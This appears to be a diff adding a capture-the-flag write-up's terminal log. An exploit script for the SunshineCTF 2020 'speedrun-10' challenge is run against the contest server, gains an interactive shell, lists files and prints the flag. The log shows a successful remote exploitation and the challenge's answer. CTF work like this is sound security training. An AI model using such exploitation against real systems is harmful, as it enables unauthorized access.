@@ -1,0 +1,17 @@
+# ./exploit_10.py REMOTE=1
+[*] '/pwd/datajerk/sunshinectf2020/speedrun-10/chall_10'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Opening connection to chal.2020.sunshinectf.org on port 30010: Done
+[*] Switching to interactive mode
+$ id
+uid=1000(chall_10) gid=1000(chall_10) groups=1000(chall_10)
+$ ls -l
+total 12
+-rwxr-xr-x 1 root root     7348 Nov  7 07:49 chall_10
+-rw-r----- 1 root chall_10   39 Nov  7 08:52 flag.txt
+$ cat flag.txt
+sun{second-heartbeat-aeaff82332769d0f}
